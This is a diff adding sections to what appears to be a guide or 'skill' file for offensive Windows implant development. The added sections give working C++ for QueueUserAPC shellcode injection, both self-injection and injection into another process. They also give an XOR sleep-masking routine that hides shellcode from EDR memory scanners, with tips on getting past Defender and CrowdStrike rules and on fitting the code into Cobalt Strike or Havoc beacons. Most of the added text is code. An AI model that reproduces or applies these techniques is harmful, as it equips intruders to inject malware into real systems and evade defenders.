@@ -144,6 +144,98 @@ the callback to not crash. For BOOL-returning callbacks, ensure the shellcode en
 `mov eax, 1 ; ret` (or similar). A stub that just returns 0 will cause the enumerator
 to stop after the first call — which is fine for a single invocation.
 
+## QueueUserAPC variant (alertable wait pattern)
+
+`QueueUserAPC` fires a function pointer when a thread enters an **alertable wait** —
+a `SleepEx`, `WaitForSingleObjectEx`, or `NtWaitForSingleObject` call with
+`bAlertable = TRUE`. This avoids `CreateThread` / `RtlCreateUserThread` signatures
+entirely.
+
+### Same-process (self-injection via alertable sleep)
+```cpp
+// Allocate and write shellcode as normal (RW then flip to RX)
+// Queue the APC against the current thread
+QueueUserAPC((PAPCFUNC)pShellcode, GetCurrentThread(), NULL);
+
+// Enter alertable wait — APC fires here
+SleepEx(INFINITE, TRUE);   // bAlertable = TRUE
+// Execution continues here after shellcode returns (or doesn't return)
+```
+
+**Key constraint:** the calling thread must enter an alertable wait *after* the APC
+is queued. `Sleep` (non-Ex) is not alertable — it will not fire the APC.
+
+### Cross-process (inject into another process's thread)
+```cpp
+// Preconditions: target process has a thread in (or regularly entering) alertable wait
+// Many Win32 threads enter alertable waits — STA COM threads, UI threads
+
+HANDLE hProc   = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, targetTid);
+
+LPVOID pRemote = VirtualAllocEx(hProc, NULL, dwLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+WriteProcessMemory(hProc, pRemote, pDecryptedShellcode, dwLen, NULL);
+
+// Queue the APC — fires when the target thread next enters an alertable wait
+QueueUserAPC((PAPCFUNC)pRemote, hThread, NULL);
+
+CloseHandle(hThread);
+CloseHandle(hProc);
+```
+
+**Gotchas for QueueUserAPC:**
+- The target thread may never enter an alertable state — the APC will never fire
+- MDE and CS Falcon have rules for `QueueUserAPC` called from a non-thread-pool context
+- `NtQueueApcThread` (direct syscall variant) is harder to hook but still monitored
+- For the same-process pattern, combine with call stack spoofing on the thread that
+  calls `SleepEx` — the stack during alertable wait is visible to EDR
+
+## Heap encryption for the sleep masking window
+
+During the sleep window, an EDR memory scanner can find your shellcode in RW/RX memory.
+**Heap encryption** solves this: encrypt the shellcode buffer before sleeping, decrypt
+after waking. The scanner sees ciphertext — no recognisable patterns.
+
+**Requirements:**
+- The sleep trampoline (the code handling encrypt → sleep → decrypt) must be in a
+  **separate, always-clean region** — you cannot encrypt the page you are executing from
+- The shellcode region must be RW (not RX) during the encrypted sleep window
+
+```cpp
+// Minimal heap-encrypt sleep callback
+// This function lives in a separate allocation that is never encrypted.
+// pShellcode = RW region containing your shellcode; key = XOR byte
+
+void SleepMasked(LPVOID pShellcode, DWORD dwLen, BYTE key, DWORD dwSleepMs) {
+    // 1. Encrypt shellcode in-place
+    DWORD dwOld;
+    VirtualProtect(pShellcode, dwLen, PAGE_READWRITE, &dwOld);
+    for (DWORD i = 0; i < dwLen; i++) ((PBYTE)pShellcode)[i] ^= key;
+
+    // 2. Spoof call stack (see call-stack-spoofing skill)
+    //    SpatchStack();  // optional but recommended
+
+    // 3. Sleep — EDR scans: no RX memory, shellcode is ciphertext
+    Sleep(dwSleepMs);
+
+    // 4. Decrypt
+    for (DWORD i = 0; i < dwLen; i++) ((PBYTE)pShellcode)[i] ^= key;
+
+    // 5. Restore RX and continue
+    VirtualProtect(pShellcode, dwLen, PAGE_EXECUTE_READ, &dwOld);
+}
+```
+
+**Key design points:**
+- Use a random key per sleep cycle (derive from a PRNG seeded at injection time)
+- Call `SleepMasked` from the implant's main beacon loop — not from inside the shellcode page
+- The `SleepMasked` function itself should live in a VirtualAlloc'd region backed by
+  ntdll (via module stomping) or in the loader's `.text` section — not in a private
+  allocation that looks suspicious
+- For multi-stage implants (CS Beacon / Havoc): the C2 framework's sleep callback
+  API (`BeaconSetSleepMask`) is the correct integration point; use this pattern for
+  custom loaders only
+
 ## Sleep masking integration
 
 For a full sleep mask (not just jitter), combine with call stack spoofing:
